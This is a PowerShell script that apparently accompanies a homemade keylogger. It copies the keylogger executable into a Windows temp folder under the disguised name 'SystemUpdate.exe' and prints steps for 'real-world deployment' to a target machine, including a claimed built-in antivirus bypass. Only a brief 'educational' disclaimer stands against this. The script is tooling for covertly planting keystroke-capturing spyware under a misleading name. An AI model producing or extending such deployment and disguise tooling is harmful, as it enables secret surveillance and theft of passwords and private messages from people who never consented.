# Production Test Script - Optimized Version
Write-Host "🚀 Testing Optimized Self-Contained Keylogger..." -ForegroundColor Cyan

# Copy to a temporary location (simulating transfer to target system)
$testDir = "C:\Windows\Temp\OptimizedTest"
$exePath = "bin\Release\net9.0-windows\win-x64\publish\LoggerApp.exe"

try {
    # Create test directory
    if (-not (Test-Path $testDir)) {
        New-Item -ItemType Directory -Path $testDir -Force | Out-Null
    }
    
    # Copy only the EXE file (no .env needed now!)
    Copy-Item $exePath "$testDir\SystemUpdate.exe" -Force
    
    Write-Host "✅ Single file copied to: $testDir" -ForegroundColor Green
    
    # Show file info
    $file = Get-Item "$testDir\SystemUpdate.exe"
    $sizeMB = [math]::Round($file.Length / 1MB, 2)
    Write-Host "📦 File Size: $sizeMB MB (Optimized!)" -ForegroundColor Yellow
    Write-Host "📅 Created: $($file.CreationTime)" -ForegroundColor Yellow
    
    Write-Host "`n🎯 Optimization Results:" -ForegroundColor Cyan
    Write-Host "  ✅ Size reduced from 115MB to $sizeMB MB" -ForegroundColor Green
    Write-Host "  ✅ No .env file dependency" -ForegroundColor Green
    Write-Host "  ✅ Single executable file only" -ForegroundColor Green
    Write-Host "  ✅ All configs embedded and encrypted" -ForegroundColor Green
    Write-Host "  ✅ Compressed and optimized" -ForegroundColor Green
    
    Write-Host "`n🔥 Real-World Deployment:" -ForegroundColor Red
    Write-Host "   1. Copy ONLY SystemUpdate.exe to target" -ForegroundColor White
    Write-Host "   2. Double-click to run" -ForegroundColor White
    Write-Host "   3. Zero dependencies!" -ForegroundColor White
    Write-Host "   4. Auto AV bypass built-in" -ForegroundColor White
    Write-Host "   5. Completely standalone" -ForegroundColor White
    
    Write-Host "`n⚠️  Educational/Testing Purposes Only!" -ForegroundColor Yellow
    
} catch {
    Write-Host "❌ Error: $_" -ForegroundColor Red
}

Write-Host "`nOptimization Complete! Press Enter to continue..."
Read-Host
